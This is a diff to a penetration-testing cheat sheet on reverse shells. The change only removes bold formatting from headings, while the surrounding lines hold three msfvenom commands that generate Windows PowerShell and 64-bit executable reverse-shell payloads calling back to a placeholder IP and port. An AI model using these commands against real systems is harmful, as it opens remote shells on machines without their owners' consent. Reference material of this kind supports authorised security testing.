@@ -1,12 +1,12 @@
 # Reverse Shells
 
-1. **x86 (32-bit) Payloads**
+1. x86 (32-bit) Payloads
 
 `$ msfvenom -p cmd/windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> -o shell.ps1`
 
 `$ msfvenom -p windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> -o shell.ps1`
 
-2. **x86-64 (64-bit) Payloads**
+2. x86-64 (64-bit) Payloads
 
 `$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x64.exe`
 
